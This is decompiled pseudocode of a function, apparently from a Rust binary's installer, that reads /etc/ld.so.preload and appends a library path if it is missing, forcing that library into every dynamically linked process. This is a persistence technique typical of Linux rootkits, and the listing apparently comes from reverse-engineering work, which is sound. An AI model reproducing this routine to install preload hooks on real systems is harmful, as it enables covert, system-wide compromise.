__int64 __fastcall binary::install::add_preload_hook(__int64 a1)
{
  __int64 v2; // r8
  __int64 v3; // r9
  __int64 v4; // rax
  __int64 v5; // rdx
  __int64 v6; // r14
  __int64 v7; // rdx
  __int64 v8; // r15
  __int64 v9; // rax
  __int64 v10; // r8
  __int64 v11; // r9
  __int64 v12; // rdx
  __int64 (__fastcall *v13)(); // rdx
  __int64 v14; // rdi
  __int64 v15; // rax
  __int64 v16; // r8
  __int64 v17; // r9
  unsigned int v19; // [rsp+Ch] [rbp-ACh] BYREF
  char **v20; // [rsp+10h] [rbp-A8h] BYREF
  __int64 v21; // [rsp+18h] [rbp-A0h]
  __int128 *v22; // [rsp+20h] [rbp-98h]
  __int128 v23; // [rsp+28h] [rbp-90h]
  __int128 v24; // [rsp+40h] [rbp-78h] BYREF
  const char *v25; // [rsp+50h] [rbp-68h]
  __int64 (__fastcall *v26)(); // [rsp+58h] [rbp-60h]
  __int64 v27; // [rsp+60h] [rbp-58h]
  __int128 v28; // [rsp+68h] [rbp-50h] BYREF
  __int64 v29; // [rsp+78h] [rbp-40h]
  __int128 *v30; // [rsp+80h] [rbp-38h] BYREF
  __int64 (__fastcall *v31)(); // [rsp+88h] [rbp-30h]
  __int128 v32; // [rsp+90h] [rbp-28h] BYREF

  if ( (unsigned __int64)core::sync::atomic::atomic_load(a1) > 2 )
  {
    v28 = *(_OWORD *)(a1 + 8);
    v30 = &v28;
    v31 = <std::path::Display as core::fmt::Display>::fmt;
    v20 = &off_18E6B08;
    v21 = 1LL;
    v22 = (__int128 *)&v30;
    v23 = 1uLL;
    *(_QWORD *)&v24 = aBinaryInstall;
    *((_QWORD *)&v24 + 1) = 15LL;
    v25 = aBinaryInstall;
    v26 = (__int64 (__fastcall *)())(byte_9 + 6);
    v27 = log::__private_api::loc(&off_18E6B88);
    log::__private_api::log(&v20, 3LL, &v24, aBinaryInstall, v2, v3);
  }
  *(_QWORD *)&v28 = 0LL;
  *((_QWORD *)&v28 + 1) = 1LL;
  v29 = 0LL;
  std::fs::File::open(&v20, aEtcLdSoPreload, 18LL);
  if ( (_DWORD)v20 == 1
    || (LODWORD(v24) = HIDWORD(v20),
        v4 = <std::fs::File as std::io::Read>::read_to_string(&v24, &v28),
        core::result::Result<T,E>::unwrap(v4, v5),
        core::ptr::drop_in_place<std::fs::File>((unsigned int)v24),
        ((unsigned __int8)v20 & 1) != 0) )
  {
    core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>(&v20);
  }
  v6 = core::str::<impl str>::trim_end_matches(*((_QWORD *)&v28 + 1), v29);
  v8 = v7;
  alloc::string::String::from_utf8_lossy(&v20, *(_QWORD *)(a1 + 8), *(_QWORD *)(a1 + 16));
  if ( (unsigned __int8)<&str as core::str::pattern::Pattern>::is_contained_in(v21, v22, v6, v8) )
  {
    core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v20);
    if ( (unsigned __int64)core::sync::atomic::atomic_load(&v20) >= 3 )
    {
      v20 = &off_18E6B78;
      v21 = 1LL;
      v22 = (_OWORD *)&byte_8;
      v23 = 0LL;
      v9 = log::__private_api::loc(&off_18E6C18);
      *(_QWORD *)&v24 = aBinaryInstall;
      *((_QWORD *)&v24 + 1) = 15LL;
      v25 = aBinaryInstall;
      v26 = (__int64 (__fastcall *)())(byte_9 + 6);
      v27 = v9;
      log::__private_api::log(&v20, 3LL, &v24, aBinaryInstall, v10, v11);
    }
  }
  else
  {
    core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v20);
    std::fs::File::create(&v20, aEtcLdSoPreload, 18LL);
    v19 = core::result::Result<T,E>::unwrap(&v20);
    core::str::<impl str>::trim_end_matches(*((_QWORD *)&v28 + 1), v29);
    if ( v12 )
    {
      v32 = *(_OWORD *)(a1 + 8);
      v30 = (__int128 *)core::str::<impl str>::trim_end_matches(*((_QWORD *)&v28 + 1), v29);
      v31 = v13;
      *(_QWORD *)&v24 = &v32;
      *((_QWORD *)&v24 + 1) = <std::path::Display as core::fmt::Display>::fmt;
      v25 = (const char *)&v30;
      v26 = <&T as core::fmt::Display>::fmt;
      v20 = (char **)&unk_18E6B18;
      v21 = 3LL;
      v22 = &v24;
      v23 = 2uLL;
      v14 = std::io::Write::write_fmt(&v19, &v20);
      core::result::Result<T,E>::unwrap(v14, &off_18E6BE8);
    }
    else
    {
      v24 = *(_OWORD *)(a1 + 8);
      v30 = &v24;
      v31 = <std::path::Display as core::fmt::Display>::fmt;
      v20 = (char **)&unk_18E6B48;
      v21 = 2LL;
      v22 = (__int128 *)&v30;
      v23 = 1uLL;
      v14 = std::io::Write::write_fmt(&v19, &v20);
      core::result::Result<T,E>::unwrap(v14, &off_18E6BD0);
    }
    if ( (unsigned __int64)core::sync::atomic::atomic_load(v14) > 2 )
    {
      v20 = &off_18E6B68;
      v21 = 1LL;
      v22 = (_OWORD *)&byte_8;
      v23 = 0LL;
      v15 = log::__private_api::loc(&off_18E6C00);
      *(_QWORD *)&v24 = aBinaryInstall;
      *((_QWORD *)&v24 + 1) = 15LL;
      v25 = aBinaryInstall;
      v26 = (__int64 (__fastcall *)())(byte_9 + 6);
      v27 = v15;
      log::__private_api::log(&v20, 3LL, &v24, aBinaryInstall, v16, v17);
    }
    core::ptr::drop_in_place<std::fs::File>(v19);
  }
  core::ptr::drop_in_place<alloc::string::String>(&v28);
  return core::ptr::drop_in_place<std::path::PathBuf>(a1);
}